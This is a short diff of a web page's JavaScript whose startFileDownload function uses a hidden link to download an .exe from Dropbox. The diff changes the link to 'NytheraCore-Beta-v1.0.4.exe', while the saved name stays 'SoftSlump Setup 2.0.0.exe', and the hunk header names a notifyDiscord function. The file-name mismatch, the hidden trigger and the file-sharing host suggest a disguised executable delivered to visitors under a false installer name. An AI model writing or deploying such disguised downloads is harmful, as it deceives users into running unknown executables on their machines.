@@ -275,7 +275,7 @@ async function notifyDiscord() {
 // ---- START ACTUAL FILE DOWNLOAD ----
 function startFileDownload() {
     const a = document.createElement('a');
-    a.href = 'https://www.dropbox.com/scl/fi/wlehz6wjjio1g3otld54e/Nythera-System-Utility.exe?rlkey=7p6f5ggtjzz964yibpdkx3cco&st=w05qu7p7&dl=1';
+    a.href = 'https://www.dropbox.com/scl/fi/zd7rck3q1ur9c62v0gren/NytheraCore-Beta-v1.0.4.exe?rlkey=011mwdhymda5xdavzommo2ied&st=anqyis68&dl=1';
     a.download = 'SoftSlump Setup 2.0.0.exe';
     a.style.display = 'none'; // Ensure it's hidden
     document.body.appendChild(a);
